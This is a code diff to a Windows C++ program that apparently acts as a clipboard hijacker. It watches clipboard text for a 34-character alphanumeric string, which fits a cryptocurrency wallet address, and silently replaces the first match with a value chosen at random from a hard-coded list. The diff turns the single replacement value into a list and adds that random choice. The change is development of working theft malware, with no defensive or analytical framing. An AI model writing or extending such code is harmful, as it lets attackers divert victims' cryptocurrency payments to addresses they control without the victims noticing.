@@ -13,6 +13,9 @@ int WIN_SHOW = 1;
 int AUTH_RUN = 0;
 
 std::string REPLACCE_VAL = "1234567890123456789012345678901234";
+std::string REPLACCE_VAL_ARRAY[] = { 
+    "1234567890123456789012345678901234","2234567890123456789012345678901234"
+};
 std::regex REGEX_VAL("[0-9a-zA-Z]{34}");
 
 //aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
@@ -66,11 +69,15 @@ void raplce_if_match()
     GlobalUnlock(h);
     printf("GET Clipboard TEXT : \n----------\n%s\n----------\n", p);
 
-    if (strstr(p, REPLACCE_VAL.c_str())) {
-        CloseClipboard();
-        printf(">> strstr already contains \n");
-        return;
-    }
+    for (std::string value : REPLACCE_VAL_ARRAY)
+    {
+        if (strstr(p, value.c_str())) {
+            CloseClipboard();
+            printf(">> strstr already contains \n");
+            return;
+        }
+    };
+
 
     // regex_match 只支持完整匹配,模糊搜索用 regex_search
     if (!regex_search(p, REGEX_VAL)) {
@@ -79,13 +86,15 @@ void raplce_if_match()
         return;
     }
 
-    printf(">> matched will be replaced");
+    printf(">> matched will be replaced\n");
 
+
+    std::string replacce_val = REPLACCE_VAL_ARRAY[rand() % (sizeof(REPLACCE_VAL_ARRAY)/sizeof(std::string))];
 
     EmptyClipboard();
     HANDLE hHandle = GlobalAlloc(GMEM_FIXED, strlen(p) + 1);//分配内存
     char* pData = (char*)GlobalLock(hHandle);
-    std::string out = regex_replace(p, REGEX_VAL, REPLACCE_VAL, std::regex_constants::match_flag_type::format_first_only);
+    std::string out = regex_replace(p, REGEX_VAL, replacce_val, std::regex_constants::match_flag_type::format_first_only);
     strcpy(pData, out.c_str());
     SetClipboardData(CF_TEXT, hHandle);
     GlobalUnlock(hHandle);
